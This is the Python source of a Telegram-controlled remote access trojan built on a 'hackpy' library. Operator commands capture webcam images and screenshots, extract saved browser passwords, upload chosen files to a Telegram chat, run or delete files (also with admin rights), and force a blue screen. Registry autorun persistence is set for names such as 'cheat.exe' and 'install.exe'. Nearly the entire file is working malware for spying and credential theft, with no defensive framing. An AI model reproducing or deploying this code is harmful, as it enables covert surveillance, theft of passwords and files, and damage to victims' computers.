import telebot
import hackpy
import requests
import socket
import bs4
import time
import pyautogui
import webbrowser
from PIL import ImageGrab
import os
from hackpy.passwords import passwordsRecovery
from hackpy.passwords import getenv
from hackpy.passwords import copy2
from hackpy.passwords import CryptUnprotectData
from hackpy.passwords import path
from hackpy.passwords import sql_connect
from email.message import EmailMessage
bot = telebot.TeleBot('') #token

chat_id =  00000000 #CHANGE chat_id
bot_token = '' #token 


	


	
	
filemanager = hackpy.file


def desktopscreen():
	screen = ImageGrab.grab() 


	screen.save(os.getenv("APPDATA") + '\\desktop.png') 
	screen = open(os.getenv("APPDATA") + '\\desktop.png', 'rb') 
	files = {'photo': screen} 
	requests.post("https://api.telegram.org/bot" + bot_token + "/sendPhoto?chat_id=" + str(chat_id) , files=files) 


def sentphoto():
		hackpy.webcamScreenshot(filename = 'screenshot.png', delay = 4500, camera = 1)
	

		
		bot.send_photo(chat_id, open('screenshot.png', 'rb'))

@bot.message_handler(commands=['webcam'])
def start_message3(message):
	sentphoto()


@bot.message_handler(commands=['screen'])
def start_message4(message):
	desktopscreen()


@bot.message_handler(commands=['steal'])
def start_message6(message):   
	for key, account in passwordsRecovery():
		bot.send_message(message.chat.id, 'result' + 
			'\n['  + str(key) + ']'
			'\n |____ SITE: ' + account['url'] + 
			'\n |____ USER: ' + account['login'] + 
			'\n |____ PASS: ' + account['password'])
			

@bot.message_handler(commands=['info'])
def start_message2(message):
	s = requests.get('https://2ip.ua/ru/')

	b = bs4.BeautifulSoup(s.text, "html.parser")

	a = b.select(" .ipblockgradient .ip")[0].getText()
	bot.send_message(message.chat.id, '\nInfo:' +
	'\nUsername: '     + hackpy.userInfo()      +
	'\nVersion: '      + hackpy.versionInfo()   +
	'\nRelease: '      + hackpy.releaseInfo()   +
	'\nSystem: '       + hackpy.systemInfo()    +
	'\nNode: '         + hackpy.nodeInfo()      +
	'\nMachine: '      + hackpy.machineInfo()   +
	'\nProcessor: '    + hackpy.processorInfo() +
	'\nPlatform: '     + hackpy.platformInfo()  +
	'\nArchitecture: ' + hackpy.architecture()  +
	'\nIP :' +  (a))
	
	
	
	

	
@bot.message_handler(commands=['cursor'])
def start_message9(message):
	pyautogui.dragTo(200,400, duration=0.6)
	

	
@bot.message_handler(commands=['degress'])
def start_message10(message):
	for i in range(0,5+1):
		i+1
		for degrees in (90, 180, 270, 0):
			hackpy.rotateScreen(degrees)
			time.sleep(0.10)
	

@bot.message_handler(commands=['bsod'])
def start_message11(message):
	hackpy.bsod()

	
@bot.message_handler(commands=['help'])
def start_message12(message):
	bot.send_message(message.chat.id, '\nwebcam\nscreen\nsteal\ninfo\ndegress\nbsod\nhelp\ncursor\ndirect\nwebopen\nremovefile\nstartfile\nscanfile\nstartfileasad\nsave\ncd')
	
		

@bot.message_handler(commands=['direct']) 
def directcheck(command):
	directoryb = os.path.abspath(os.getcwd())
	bot.send_message(chat_id, "Direct: \n" + (str(directoryb)))


@bot.message_handler(commands=['webopen']) 
def webopen(message):
	try:
		link = "{0}".format(message.text)
		urlres = link.split(" ")[1]
		webbrowser.open_new_tab(urlres)
		bot.send_message(chat_id, "open!")
	except:
		bot.send_message(chat_id, "error!")
 	
	

	
	
@bot.message_handler(commands=['removefile'])
def filecontrol(message):
	texts = "{0}".format(message.text)
	
	textress = texts.split(" ")[1]
	filemanager.remove(textress)


@bot.message_handler(commands =["save"]) 
def downloadfile(message):
 try:
    user_msg = "{0}".format(message.text)
    docc = user_msg.split(" ")[1]  
    doccc = {'document': open(docc,'rb')}  
    requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id , files=doccc)  
 except:
     bot.send_message(chat_id, "Error!")
  
@bot.message_handler(commands=["cd"])
def cddir(message):
	try:
		user_msg = "{0}".format(message.text)  
		folder = user_msg.split(" ")[1]
		os.chdir(folder)
		bot.send_message(chat_id, "Directory change   on " + folder)
	except:
	 	bot.send_message(chat_id, "Error")
	 
	
	
@bot.message_handler(commands=['startfile'])
def filecontrol3(message):
	textsss = "{0}".format(message.text)
	
	textressss = textsss.split(" ")[1]
	filemanager.start(textressss)

@bot.message_handler(commands=['startfileasad'])
def filecontrol4(message):
	textssss = "{0}".format(message.text)
	
	textresssss = textssss.split(" ")[1]
	filemanager.startAsAdmin(textresssss)


@bot.message_handler(commands=["scanfile"]) 
def checkfile(commands):
 try:
	 dirs = '\n'.join(os.listdir(path="."))
	 bot.send_message(chat_id, "Files: " + "\n" + dirs)
 except:
	 bot.send_message(chat_id, "error")

	
	

hackpy.autorun('%APPDATA%//testprog.exe').installRegistry()
hackpy.autorun('testprog.exe').installRegistry()
hackpy.autorun('%APPDATA%//install.exe').installRegistry()
hackpy.autorun('install.exe').installRegistry()
hackpy.autorun('%APPDATA%//cheat.exe').installRegistry()
hackpy.autorun('cheat.exe').installRegistry()






bot.polling()